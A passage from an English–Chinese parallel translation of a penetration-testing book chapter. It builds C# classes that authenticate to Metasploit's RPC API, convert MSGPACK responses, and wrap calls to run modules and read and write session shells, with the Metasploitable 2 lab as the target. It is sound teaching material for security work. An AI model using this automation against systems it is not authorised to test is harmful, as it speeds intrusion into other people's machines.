  id: totrans-115
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: msgpackWriter.Pack(arg);
- en: '}'
  id: totrans-116
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-117
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➏using (MemoryStream mstream = new MemoryStream())
  id: totrans-118
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➏using (MemoryStream mstream = new MemoryStream())
- en: '{'
  id: totrans-119
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (WebResponse response = request.GetResponse())
  id: totrans-120
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (WebResponse response = request.GetResponse())
- en: using (Stream rstream = response.GetResponseStream())
  id: totrans-121
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (Stream rstream = response.GetResponseStream())
- en: rstream.CopyTo(mstream);
  id: totrans-122
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: rstream.CopyTo(mstream);
- en: ''
  id: totrans-123
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: mstream.Position = 0;
  id: totrans-124
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: mstream.Position = 0;
- en: ''
  id: totrans-125
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: MessagePackObjectDictionary resp =
  id: totrans-126
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: MessagePackObjectDictionary resp =
- en: Unpacking.➐UnpackObject(mstream).AsDictionary();
  id: totrans-127
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Unpacking.➐UnpackObject(mstream).AsDictionary();
- en: return MessagePackToDictionary(resp);
  id: totrans-128
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return MessagePackToDictionary(resp);
- en: '}'
  id: totrans-129
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-130
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-5: The  MetasploitSession  class’s  Execute()  method'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 第11-5节：MetasploitSession类的Execute()方法
- en: At ➊, we check whether auth.login was passed as the RPC method, which is the
    only RPC method that doesn’t require authentication. If the method is not auth.login
    and we have no authentication token set, we throw an exception because the command
    passed to be executed will fail without authentication.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 在➊处，我们检查是否传递了auth.login作为RPC方法，这是唯一一个不需要认证的RPC方法。如果方法不是auth.login而且我们没有设置认证令牌，就会抛出异常，因为没有认证的命令执行会失败。
- en: Once we know that we have the authentication necessary to make the API HTTP
    request, we set the ContentType to binary/message-pack ➋ so that the API knows
    we are sending it MSGPACK data in the HTTP body. We then create a Packer class
    by passing the HTTP request stream to the Packer.Create() method ➌. The Packer
    class (defined in the MsgPack.Cli library) is a real time-saver that allows us
    to write our RPC method and arguments to the HTTP request stream. We’ll use the
    various packing methods in the Packer class to serialize and write the RPC methods
    and arguments to the request stream.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们确认有足够的认证信息来进行 API HTTP 请求，我们会将 ContentType 设置为 binary/message-pack ➋，以便
    API 知道我们正在将 MSGPACK 数据发送到 HTTP 正文中。接着，我们通过将 HTTP 请求流传递给 Packer.Create() 方法 ➌ 来创建一个
    Packer 类。Packer 类（在 MsgPack.Cli 库中定义）是一个真正节省时间的工具，它允许我们将 RPC 方法和参数写入 HTTP 请求流中。我们将使用
    Packer 类中的各种打包方法来序列化并将 RPC 方法和参数写入请求流。
- en: 'We write the total number of pieces of information we are writing to the request
    stream using PackArrayHeader() ➍. For example, the auth.login method has three
    pieces of information: the method name and the two arguments username and password.
    We would first write the number 3 onto the stream. Then we would write the strings
    auth.login, username, and password to the stream using Pack. We’ll use this general
    process of serializing and sending the API method and arguments as the HTTP body
    to send our API requests to the Metasploit RPC.'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用 PackArrayHeader() ➘ 写入我们正在写入请求流的信息总数。例如，auth.login 方法有三条信息：方法名以及两个参数：用户名和密码。我们首先将数字
    3 写入流中。然后，我们将字符串 auth.login、username 和 password 使用 Pack 写入流中。我们将使用这种将 API 方法和参数序列化并作为
    HTTP 正文发送的通用过程来向 Metasploit RPC 发送我们的 API 请求。
- en: Having written the RPC method to the request stream, we write the authentication
    token if necessary. We then move on to packing the RPC method arguments in a foreach
    loop ➎ to finish the HTTP request making the API call.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 在将 RPC 方法写入请求流之后，如果需要，我们会写入认证令牌。然后，我们继续在 foreach 循环 ➎ 中打包 RPC 方法参数，以完成 HTTP
    请求并发起 API 调用。
- en: The rest of the Execute() method reads the HTTP response that is serialized
    with MSGPACK and converts it into C# classes that we can use. We first read the
    response into a byte array using a MemoryStream() ➏. We then deserialize the response
    with UnpackObject() ➐, passing the byte array as the only argument and returning
    the object as a MSGPACK dictionary. This MSGPACK dictionary isn’t exactly what
    we want, though. The values contained in the dictionary—such as strings—all need
    to be converted to their C# class counterparts so that we can easily use them.
    To do this, we pass the MSGPACK dictionary to the MessagePackToDictionary() method
    (discussed in the next section).
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: Execute() 方法的其余部分读取使用 MSGPACK 序列化的 HTTP 响应，并将其转换为我们可以使用的 C# 类。我们首先使用 MemoryStream()
    ➏ 将响应读取到字节数组中。然后，我们使用 UnpackObject() ➐ 反序列化响应，传入字节数组作为唯一参数，并将对象作为 MSGPACK 字典返回。然而，这个
    MSGPACK 字典并不是我们想要的。字典中包含的值——例如字符串——都需要转换为它们的 C# 类对应物，以便我们能更方便地使用它们。为此，我们将 MSGPACK
    字典传递给 MessagePackToDictionary() 方法（将在下一节讨论）。
- en: Transforming Response Data from MSGPACK
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 从 MSGPACK 转换响应数据
- en: The next few methods are mainly used to transform the API responses from Metasploit
    in the MSGPACK format into C# classes we can use more easily.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来的几个方法主要用于将 Metasploit 的 MSGPACK 格式的 API 响应转换为我们可以更容易使用的 C# 类。
- en: Converting an MSGPACK Object to a C# Dictionary with MessagePackToDictionary()
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 MessagePackToDictionary() 将 MSGPACK 对象转换为 C# 字典
- en: The MessagePackToDictionary() method shown in [Listing 11-6](#filepos788874)
    was introduced at the end of [Listing 11-5](#filepos783611) in the Execute() method.
    It accepts a MessagePackObjectDictionary and converts it into a C# dictionary
    (a class for holding key/value pairs), which is a close equivalent to a Ruby or
    Python hash.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '[MessagePackToDictionary() 方法](#filepos788874)如 [Listing 11-6](#filepos788874)
    所示，它在 [Listing 11-5](#filepos783611) 的 Execute() 方法末尾被引入。它接受一个 MessagePackObjectDictionary，并将其转换为
    C# 字典（用于存储键/值对的类），这与 Ruby 或 Python 中的哈希类似。'
- en: Dictionary<object,object> MessagePackToDictionary(➊MessagePackObjectDictionary
    dict)
  id: totrans-141
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object,object> MessagePackToDictionary(➊MessagePackObjectDictionary
    dict)
- en: '{'
  id: totrans-142
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Dictionary<object, object> newDict = new ➋Dictionary<object, object>();
  id: totrans-143
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object, object> newDict = new ➋Dictionary<object, object>();
- en: foreach (var pair in ➌dict)
  id: totrans-144
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (var pair in ➌dict)
- en: '{'
  id: totrans-145
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: object newKey = ➍GetObject(pair.Key);
  id: totrans-146
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: object newKey = ➍GetObject(pair.Key);
- en: if (pair.Value.IsTypeOf<MessagePackObjectDictionary>() == true)
  id: totrans-147
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (pair.Value.IsTypeOf<MessagePackObjectDictionary>() == true)
- en: newDict[newKey] = MessagePackToDictionary(pair.Value.AsDictionary());
  id: totrans-148
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: newDict[newKey] = MessagePackToDictionary(pair.Value.AsDictionary());
- en: else
  id: totrans-149
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else
- en: newDict[newKey] = ➎GetObject(pair.Value);
  id: totrans-150
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: newDict[newKey] = ➎GetObject(pair.Value);
- en: '}'
  id: totrans-151
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ➏return newDict;
  id: totrans-152
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➏return newDict;
- en: '}'
  id: totrans-153
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-6: The  MessagePackToDictionary()  method'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-6：MessagePackToDictionary() 方法
- en: The MessagePackToDictionary() method takes a single argument ➊, the MSGPACK
    dictionary we want to convert to a C# dictionary. Once we’ve created the C# dictionary
    ➋, we’ll put our converted MSGPACK objects in it by iterating over each key/value
    pair from the MSGPACK dictionary passed as the argument to the method ➌. First,
    we’ll get a C# object for the given key of the current loop iteration ➍, and then
    we’ll test the corresponding value to determine how best to deal with it. For
    example, if the value is a dictionary, we introduce recursion into the method
    by calling MessagePackToDictionary(). Otherwise, if the value isn’t another dictionary,
    we convert it to its corresponding C# type with GetObject(), which we’ll define
    later ➎. Finally, we return the new dictionary ➏ with the C# types instead of
    MSGPACK types.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: MessagePackToDictionary()方法接受一个参数➊，即我们要转换为C#字典的MSGPACK字典。一旦我们创建了C#字典➋，我们将通过遍历从MSGPACK字典中传递的每个键/值对将转换后的MSGPACK对象放入其中➌。首先，我们将获取给定键的C#对象，作为当前循环迭代的结果➍，然后我们将测试相应的值以确定如何最好地处理它。例如，如果值是字典，我们通过调用MessagePackToDictionary()方法引入递归。否则，如果值不是另一个字典，我们将其转换为对应的C#类型，使用GetObject()方法，这将在稍后定义➎。最后，我们返回包含C#类型而非MSGPACK类型的新字典➏。
- en: Converting an MSGPACK Object to a C# Object with GetObject()
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 使用GetObject()将MSGPACK对象转换为C#对象
- en: '[Listing 11-7](#filepos791337) shows how we implement the GetObject() method
    shown at ➍ in [Listing 11-6](#filepos788874). This method accepts a MessagePackObject,
    converts it into its C# class, and returns the new object.'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: '[列表 11-7](#filepos791337) 显示了我们如何实现[列表 11-6](#filepos788874)中第➍所示的GetObject()方法。该方法接受一个MessagePackObject，将其转换为C#类，并返回新的对象。'
- en: private object GetObject(MessagePackObject str)
  id: totrans-158
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: private object GetObject(MessagePackObject str)
- en: '{'
  id: totrans-159
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: ➊if (str.UnderlyingType == typeof(byte[]))
  id: totrans-160
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊if (str.UnderlyingType == typeof(byte[]))
- en: return System.Text.Encoding.ASCII.GetString(str.AsBinary());
  id: totrans-161
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return System.Text.Encoding.ASCII.GetString(str.AsBinary());
- en: else if (str.UnderlyingType == typeof(string))
  id: totrans-162
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else if (str.UnderlyingType == typeof(string))
- en: return str.AsString();
  id: totrans-163
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return str.AsString();
- en: else if (str.UnderlyingType == typeof(byte))
  id: totrans-164
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else if (str.UnderlyingType == typeof(byte))
- en: return str.AsByte();
  id: totrans-165
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return str.AsByte();
- en: else if (str.UnderlyingType == typeof(bool))
  id: totrans-166
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else if (str.UnderlyingType == typeof(bool))
- en: return str.AsBoolean();
  id: totrans-167
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return str.AsBoolean();
- en: ''
  id: totrans-168
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➋return null;
  id: totrans-169
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➋return null;
- en: '}'
  id: totrans-170
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-7: The  MetasploitSession  class’s  GetObject()  method'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-7：MetasploitSession 类的 GetObject() 方法
- en: The GetObject() method checks whether an object is one of a certain type, like
    a string or a Boolean, and returns the object as the C# type if it finds a match.
    At ➊, we convert any MessagePackObject with an UnderlyingType that is an array
    of bytes to a string and return the new string. Because some of the “strings”
    sent from Metasploit are actually just byte arrays, we must convert these byte
    arrays to strings in the beginning or we’ll need to cast them to strings whenever
    we want to use them. Casting often is computationally inefficient, so it’s best
    to just convert all the values up front.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: GetObject() 方法检查一个对象是否属于某种类型，例如字符串或布尔值，如果匹配则返回该对象对应的C#类型。在➊位置，我们将任何UnderlyingType为字节数组的MessagePackObject转换为字符串并返回新的字符串。由于从Metasploit发送的某些“字符串”实际上只是字节数组，我们必须在开始时将这些字节数组转换为字符串，否则每次使用时都需要强制转换为字符串。频繁的强制转换在计算上往往效率低下，因此最好在一开始就将所有值转换。
- en: The rest of the if statements check for and convert other data types. If we
    get to the last else if statement and have not been able to return a new object,
    we return null ➋. This allows us to test whether the conversion to another type
    was successful. If null is returned, we must find out why we couldn’t convert
    the MSGPACK object to another C# class.
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 其余的if语句检查并转换其他数据类型。如果我们到达最后的else if语句且无法返回新的对象，我们将返回null ➋。这允许我们测试转换到其他类型是否成功。如果返回null，我们必须找出为什么无法将MSGPACK对象转换为另一个C#类。
- en: Cleaning Up the RPC Session with Dispose()
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Dispose()清理RPC会话
- en: The Dispose() method shown in [Listing 11-8](#filepos793593) cleans up our RPC
    session during garbage collection.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 在[列表 11-8](#filepos793593)中展示的Dispose()方法会在垃圾回收期间清理我们的RPC会话。
- en: public void Dispose()
  id: totrans-176
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public void Dispose()
- en: '{'
  id: totrans-177
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (this.➊Token != null)
  id: totrans-178
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (this.➊Token != null)
- en: '{'
  id: totrans-179
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: this.Execute("auth.logout", this.Token);
  id: totrans-180
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: this.Execute("auth.logout", this.Token);
- en: _token = null;
  id: totrans-181
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _token = null;
- en: '}'
  id: totrans-182
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-183
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-8: The  MetasploitSession  class’s  Dispose()  method'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-8：MetasploitSession 类的 Dispose() 方法
- en: If our Token property ➊ is not null, we assume we are authenticated, call auth.logout
    and pass the authentication token as the only argument, and assign null to the
    local _token variable.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们的 Token 属性 ➊ 不是 null，则我们假定已经通过认证，调用 auth.logout 并将认证 token 作为唯一参数传递，然后将本地
    _token 变量赋值为 null。
- en: Testing the session Class
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 测试 session 类
- en: Now can test our session class by displaying the version of the RPC (see [Listing
    11-9](#filepos795713)). With the session class working and finished, we can begin
    really driving Metasploit and move on to exploiting Metasploitable automatically.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 现在可以通过显示 RPC 版本来测试我们的 session 类（参见 [列表 11-9](#filepos795713)）。当 session 类工作并完成后，我们可以真正开始驱动
    Metasploit，并继续自动化利用 Metasploitable。
- en: public static void Main(string[] args)
  id: totrans-188
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-189
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string listenAddr = ➊args[0];
  id: totrans-190
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string listenAddr = ➊args[0];
- en: using (MetasploitSession session = new ➋MetasploitSession("username",
  id: totrans-191
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (MetasploitSession session = new ➋MetasploitSession("username",
- en: '"password", "http://"+listenAddr+":55553/api"))'
  id: totrans-192
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '"password", "http://"+listenAddr+":55553/api"))'
- en: '{'
  id: totrans-193
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (string.IsNullOrEmpty(session.Token))
  id: totrans-194
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrEmpty(session.Token))
- en: throw new Exception("Login failed. Check credentials");
  id: totrans-195
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: throw new Exception("登录失败。检查凭证");
- en: ''
  id: totrans-196
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: Dictionary<object, object> version = session.➌Execute("core.version");
  id: totrans-197
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object, object> version = session.➌Execute("core.version");
- en: ''
  id: totrans-198
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Console.WriteLine(➍"Version: " + version["version"]);'
  id: totrans-199
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine(➍"Version: " + version["version"]);'
- en: 'Console.WriteLine(➎"Ruby: " + version["ruby"]);'
  id: totrans-200
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine(➎"Ruby: " + version["ruby"]);'
- en: 'Console.WriteLine(➏"API: " + version["api"]);'
  id: totrans-201
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Console.WriteLine(➏"API: " + version["api"]);'
- en: '}'
  id: totrans-202
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-203
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-9: Testing the  MetasploitSession  class to get version information
    from the RPC interface'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-9：测试 MetasploitSession 类以从 RPC 接口获取版本信息
- en: 'This small test program expects a single argument: the IP address for the Metasploit
    host. The first thing we do is assign the first argument to the listenAddr variable
    ➊, which is used to create a new MetasploitSession ➋. Once authenticated, we call
    the core.version RPC method ➌ to display the Metasploit ➍, Ruby ➎, and API ➏ versions
    in use, the output of which is shown in [Listing 11-10](#filepos796859).'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 这个小测试程序需要一个参数：Metasploit 主机的 IP 地址。我们做的第一件事是将第一个参数分配给 listenAddr 变量 ➊，该变量用于创建新的
    MetasploitSession ➋。认证通过后，我们调用 core.version RPC 方法 ➌，显示当前使用的 Metasploit ➍、Ruby
    ➎ 和 API ➏ 版本，输出如 [列表 11-10](#filepos796859) 所示。
- en: $ ./ch11_automating_metasploit.exe 192.168.0.2
  id: totrans-206
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ ./ch11_automating_metasploit.exe 192.168.0.2
- en: 'Version: 4.11.8-dev-a030179'
  id: totrans-207
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Version: 4.11.8-dev-a030179'
- en: 'Ruby: 2.1.6 x86_64-darwin14.0 2015-04-13'
  id: totrans-208
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Ruby: 2.1.6 x86_64-darwin14.0 2015-04-13'
- en: 'API: 1.0'
  id: totrans-209
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'API: 1.0'
- en: 'Listing 11-10: Running the  MetasploitSession  test prints the API, Ruby, and
    Metasploit version information'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-10：运行 MetasploitSession 测试打印 API、Ruby 和 Metasploit 版本信息
- en: Writing the MetasploitManager Class
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 编写 MetasploitManager 类
- en: The MetasploitManager class shown in [Listing 11-11](#filepos800376) wraps some
    basic functionality that we will need in order to drive exploitation programmatically
    via the RPC, including the ability to list sessions, read session shells, and
    execute modules.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 如 [列表 11-11](#filepos800376) 所示，MetasploitManager 类封装了我们通过 RPC 编程驱动利用所需的一些基本功能，包括列出会话、读取会话
    Shell 和执行模块的能力。
- en: 'public class MetasploitManager : IDisposable'
  id: totrans-213
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'public class MetasploitManager : IDisposable'
- en: '{'
  id: totrans-214
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: private MetasploitSession _session;
  id: totrans-215
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: private MetasploitSession _session;
- en: ''
  id: totrans-216
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public MetasploitManager(➊MetasploitSession session)
  id: totrans-217
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public MetasploitManager(➊MetasploitSession session)
- en: '{'
  id: totrans-218
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: _session = session;
  id: totrans-219
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _session = session;
- en: '}'
  id: totrans-220
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-221
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> ➋ListJobs()
  id: totrans-222
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> ➋ListJobs()
- en: '{'
  id: totrans-223
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("job.list");
  id: totrans-224
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("job.list");
- en: '}'
  id: totrans-225
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-226
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> StopJob(string jobID)
  id: totrans-227
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> StopJob(string jobID)
- en: '{'
  id: totrans-228
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("job.stop", jobID);
  id: totrans-229
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("job.stop", jobID);
- en: '}'
  id: totrans-230
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-231
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> ➌ExecuteModule(string moduleType, string moduleName,
  id: totrans-232
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> ➌ExecuteModule(string moduleType, string moduleName,
- en: Dictionary<object, object> options)
  id: totrans-233
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Dictionary<object, object> options)
- en: '{'
  id: totrans-234
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("module.execute", moduleType, moduleName, options);
  id: totrans-235
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("module.execute", moduleType, moduleName, options);
- en: '}'
  id: totrans-236
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-237
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> ListSessions()
  id: totrans-238
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> ListSessions()
- en: '{'
  id: totrans-239
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("session.list");
  id: totrans-240
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("session.list");
- en: '}'
  id: totrans-241
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-242
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> StopSession(string sessionID)
  id: totrans-243
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> StopSession(string sessionID)
- en: '{'
  id: totrans-244
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("session.stop", sessionID);
  id: totrans-245
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("session.stop", sessionID);
- en: '}'
  id: totrans-246
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-247
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> ➍ReadSessionShell(string sessionID, int? readPointer
    = null)
  id: totrans-248
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> ➍ReadSessionShell(string sessionID, int? readPointer
    = null)
- en: '{'
  id: totrans-249
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (readPointer.HasValue)
  id: totrans-250
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (readPointer.HasValue)
- en: return _session.Execute("session.shell_read", sessionID, readPointer.Value);
  id: totrans-251
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("session.shell_read", sessionID, readPointer.Value);
- en: else
  id: totrans-252
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else
- en: return _session.Execute("session.shell_read", sessionID);
  id: totrans-253
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("session.shell_read", sessionID);
- en: '}'
  id: totrans-254
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-255
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public Dictionary<object, object> ➎WriteToSessionShell(string sessionID, string
    data)
  id: totrans-256
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public Dictionary<object, object> ➎WriteToSessionShell(string sessionID, string
    data)
- en: '{'
  id: totrans-257
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return _session.Execute("session.shell_write", sessionID, data);
  id: totrans-258
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return _session.Execute("session.shell_write", sessionID, data);
- en: '}'
  id: totrans-259
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-260
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: public void Dispose()
  id: totrans-261
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public void Dispose()
- en: '{'
  id: totrans-262
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: _session = null;
  id: totrans-263
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: _session = null;
- en: '}'
  id: totrans-264
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-265
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 11-11: The  MetasploitManager  class'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 'Listing 11-11: MetasploitManager 类'
- en: The MetasploitManager constructor takes a MetasploitSession ➊ as its only argument
    and then assigns the session argument to a local class variable. The rest of the
    methods in the class simply wrap a specific RPC method that we’ll use to automate
    the exploitation of Metasploitable 2\. For example, we use the ListJobs() method
    ➋ to monitor our exploit so we know when the exploit is finished and we can run
    a command on the shelled machine.
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: MetasploitManager 构造函数将 MetasploitSession ➊ 作为唯一参数，并将会话参数分配给一个本地类变量。该类中的其他方法只是封装了我们用于自动化利用
